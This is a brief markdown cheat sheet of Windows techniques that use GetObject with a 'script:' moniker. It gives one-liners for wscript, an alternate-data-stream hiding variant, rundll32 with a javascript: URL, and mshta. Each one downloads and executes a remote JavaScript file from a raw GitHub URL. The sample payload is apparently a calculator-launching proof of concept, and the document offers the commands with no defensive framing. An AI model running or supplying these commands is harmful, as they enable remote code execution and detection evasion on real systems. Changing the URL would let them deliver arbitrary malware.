#### GetObject

wscript/cscript <br><br>
`echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") > test.js && wscript.exe test.js`<br>
<br>

Alternate data streams method <br><br>
`echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") > %temp%\test.txt:hi.js && wscript.exe %temp%\test.txt:hi.js`

rundll32<br><br>
`rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js")`
<br>
<br>
mshta 
<br><br>
`mshta.exe javascript:GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js");close();`


<br><br>ads method suggested by @yeyint_mth
